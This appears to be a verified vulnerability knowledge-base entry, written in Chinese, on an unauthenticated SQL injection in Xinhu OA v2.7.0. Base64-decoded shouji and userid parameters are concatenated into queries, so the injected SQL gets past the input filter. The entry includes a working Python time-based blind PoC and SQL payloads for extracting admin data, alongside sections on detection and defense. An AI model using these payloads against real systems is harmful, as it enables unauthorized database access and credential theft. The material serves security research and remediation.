---
id: web-generic-sqli-xinhu-setwxqy-base64-mobile-getone
title: 信呼OA v2.7.0 前台 SQL 注入：setwxqyAction 对 base64decode(shouji/userid) 直接拼入 getone
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-setwxqy-base64-decoded-getone-sqli
tags:
- sqli
- php
- xinhu
- oa
- base64
- unauth
- time-based-blind
- filter-bypass
cve: []
severity: critical
confidence: high
affected_versions: 信呼OA v2.7.0（原文源码路径 xinhu_utf8_v2.7.0，原文称最新版；未给修复版本）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V248
  verified_at: '2026-11-07T13:17:43+08:00'
  notes: 已对照原文与 13 张图核对：loginAction.php setwxqyAction 中 base64decode(shouji/userid) 后在第 306/322 行拼入 m('admin')->getone，图 3-4 与卡内 Sink 一致；前台鉴权绕过链与图 5-12 一致。核实修正：卡内 PoC 路由由 m=task&d=api 改为 d=task&m=login|api（信呼路由 webmain/task/api/loginAction.php 的规则，参见 18575 的 m=agent|api 示例）。未验证点：原文 URL/参数被红段遮盖、未展示注入回显；路由与 sleep 载荷为按源码构造，未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-xinhu-setwxqy-base64-mobile-getone/
draft: false
kb_aliases:
- 信呼OA SQL 注入
- xinhu setwxqy SQLi
- loginAction setwxqyAction
- base64decode 注入
- shouji 参数注入
- userid 参数注入
---

## 一句话结论

信呼OA v2.7.0 的 `webmain/task/api/loginAction.php` 中 `setwxqyAction()` 把 `base64decode($this->get('shouji'))` 和 `base64decode($this->get('userid'))` 直接拼接进 `m('admin')->getone("`mobile`='$shouji' AND `status`=1")` / `getone("`userid`='$userid'")`；底层 `$rock->get/post` 过滤只看到 Base64 文本（不含引号/SQL 关键字），解码后的注入语句却进入 SQL，形成前台 SQL 注入。

## 原理

- **过滤与解码的顺序错位**：信呼OA 的 `$rock->get()`/`post()` 封装会对参数做关键字/XSS 过滤，但 `shouji`、`userid` 先以 Base64 编码传入，过滤时看到的是 `[A-Za-z0-9+/=]`，不包含 `'`、`select`、`sleep`、`union` 等敏感字符；进入业务后 `$this->jm->base64decode()` 才解码出真正的 SQL 注入 payload。
- **Sink**：
  - `$shouji = $this->jm->base64decode($this->get('shouji'));`
  - `$userid = $this->jm->base64decode($this->get('userid'));`
  - `$urs = m('admin')->getone("`mobile`='$shouji' AND `status`=1");`
  - `$ors = $obj->getone("`userid`='$userid'");`
  `getone()` 最终调用 `$this->db->getone($this->table, $where, ...)`，`$where` 是拼接后的字符串，没有预处理/参数化，也没有对 `$shouji`/`$userid` 做 `intval` 或转义。
- **为什么是前台**：该接口属于 `login`/`api` 模块白名单，`apiAction::initAction()` 中的 `$boss` 判断跳过了 token/登录/用户状态三段校验；同时 `ActionNot` 用空方法覆写了 `logincheck()`，使 `Action::initProject() → getlogin() → logincheck()` 走到空实现而不是 `loginnot()`。鉴权链详见关联卡；本条只依赖该接口可未授权访问。
- **利用面**：`mobile='$shouji' AND status=1` 是典型的字符串上下文，可用 `'` 闭合后接 `AND/OR`、`IF()`、`SLEEP()`、`UNION` 等；由于 `getone` 返回一行并参与后续逻辑，优先用时间/布尔盲注判断，若页面回显 `$urs` 字段可尝试 UNION。`userid` 位置同理，且在 `$urs` 成功后还会进入 `getone("`userid`='$userid'")`。
- **挖掘方法**：全局搜索 `base64decode(` 等解密关键词，聚焦 `webmain/*/api/*Action.php` 等 Action 文件，找“参数先解码、后拼接 SQL”的传参点；原文归纳的三条思路是硬刚过滤规则、寻找不使用封装方法的传参点、利用加密字符串绕过字符检测，本条属于第三种。

## 触发条件

- 目标为信呼OA v2.7.0（或存在相同 `setwxqyAction` 代码的版本），`webmain/task/api/loginAction.php` 可访问。
- 接口处于 `login`/`api` 模块白名单，鉴权链被 `$boss` + 空 `logincheck` 绕过（见关联卡），无需登录即可请求。
- 数据库为 MySQL，支持 `IF()`/`SLEEP()`/`UNION` 等；`admin` 表存在 `mobile`、`userid`、`status` 等字段。
- 攻击者能发送 Base64 编码的参数（URL 编码后传输），并观察响应时间/内容差异。

## 利用步骤

1. 确认目标为信呼OA，定位 `webmain/task/api/loginAction.php` 的 `setwxqyAction()`，确认 `shouji`/`userid` 的 base64decode 与 `getone` 拼接。
2. 确认接口可未授权访问（不带 Cookie 请求，若返回业务错误/正常处理而非登录跳转，说明鉴权链已绕过）。
3. 构造 `shouji` 的 Base64 payload，先用 `SLEEP()` 做时间盲注验证：
   - 明文：`1' AND IF(1=1,SLEEP(3),0)-- -`
   - Base64 后作为 `shouji` 参数发送。
4. 对比 `IF(1=1,...)` 与 `IF(1=2,...)` 的响应时间，确认注入成立；再用 `ASCII(SUBSTR((SELECT ...),pos,1))` 逐字符提取数据库名、`admin` 表字段/管理员密码哈希。
5. 若响应回显 `$urs['id']`/`$urs['user']` 等字段，可尝试 UNION 直接回显；否则使用时间/布尔盲注。
6. 也可在 `userid` 参数上重复测试（`userid='$userid'`），或在 `zwxqy_user` 的 `getone/insert/update` 链上寻找二次注入。
7. 记录请求、响应时间/内容与提取结果作为证据；测试时控制请求频率，避免对业务造成压力。

## PoC

时间盲注验证（请求路径按信呼路由规则，原文未展示完整 URL，需按目标实际路由调整）：

```python
import base64
import time
import requests

BASE = "http://target/index.php"   # 路由示例：?d=task&m=login|api&a=setwxqy（| 通常编码为 %7C）
PARAMS = {"d": "task", "m": "login|api", "a": "setwxqy"}

def probe(cond, delay=3):
    payload = f"1' AND IF({cond},SLEEP({delay}),0)-- -"
    shouji = base64.b64encode(payload.encode()).decode()
    params = dict(PARAMS, shouji=shouji)
    t0 = time.time()
    try:
        r = requests.get(BASE, params=params, timeout=delay + 5)
        return time.time() - t0, r.status_code, r.text[:200]
    except requests.Timeout:
        return time.time() - t0, "timeout", ""

print(probe("1=1"))   # 预期延迟约 3 秒
print(probe("1=2"))   # 预期立即返回
```

Base64 示例：

```text
# 明文：1' AND IF(1=1,SLEEP(3),0)-- -
shouji = MScgQU5EIElGKDE9MSxTTEVFUCgzKSwwKS0tIC0=
```

布尔/数据提取思路：

```sql
-- 判断 database() 首字符
1' AND IF(ASCII(SUBSTR((SELECT DATABASE()),1,1))>64,SLEEP(2),0)-- -
-- 读取 admin 表字段（按实际列名调整）
1' AND IF(ASCII(SUBSTR((SELECT `user` FROM `admin` LIMIT 1),1,1))>64,SLEEP(2),0)-- -
```

说明：原文 PoC 截图中的 URL 与参数被红段遮盖，未给出可直接复现的完整报文；以上按源码中的 Sink 与信呼路由规则整理，需在授权目标上先验证 `shouji` 参数是否被正确解码、`m/d/a` 路由是否匹配。未在本机执行。

## 变体与关联

- 变体：`userid` 参数同样 `base64decode` 后拼入 `getone("`userid`='$userid'")`，可替换注入点；若 `shouji` 分支先返回失败，`userid` 分支可能仍可达。
- 变体：其他 `base64decode(` 调用点（`webmainAction.php:330` 的 `submitfields_postabc`、`inputAction.php:788` 的 `actstr`、`indexAction.php` 的 `homeurl`/`homename`/`menuid` 等）也采用“先解码后使用”模式，可作为同类审计目标；是否可注入取决于后续是否拼接 SQL。
- 变体：若目标对 Base64 文本本身也有关键字过滤，可调整 payload 尾部空格/注释，使 Base64 结果不含被禁子串；或使用 URL-safe Base64/双 Base64（需与服务端解码方式一致）。
- 关联：[[web-generic-auth-xinhu-logincheck-empty-inheritance-bypass]]（本注入可前台触发的鉴权绕过链）、[[web-generic-auth-xinhu-publicsave-arbitrary-table-write]]（同系统另一条越权链）、[[web-generic-sqli-metinfo-search-para-base64-blind]]（Base64 解码后拼接绕过前置过滤的同型案例）。
- 边界：若目标版本对 `shouji`/`userid` 做 `intval`、参数化查询或解码后再过滤，注入失效；若接口被 WAF 在解码后二次检测，也可能被拦；时间盲注受网络抖动影响，需多次采样。

## 检测与防御

- 检测：请求参数 `shouji`/`userid` 为 Base64 且解码后含 `'`、`IF(`、`SLEEP(`、`UNION`、`SELECT` 等；同一 IP 对 `setwxqy`/`login`/`api` 接口高频请求且响应时间规律性波动；日志中出现 `base64decode` 相关异常报错。
- 防御：对 `$shouji`/`$userid` 做类型/格式白名单校验（手机号/用户 ID 只允许数字），使用参数化查询/预处理，禁止字符串拼接；不要在业务层直接拼接解码后的用户输入。
- 防御：WAF/过滤器应在 Base64 解码后再检测（先解码、后匹配），不能只检查编码文本；对 `base64decode` 后的值再做长度/字符集限制。
- 加固：修复鉴权链（见关联卡），确保接口即使被未授权访问也无法执行 SQL；数据库账户最小权限；错误页不返回 SQL 报错；对敏感表访问做审计与告警。
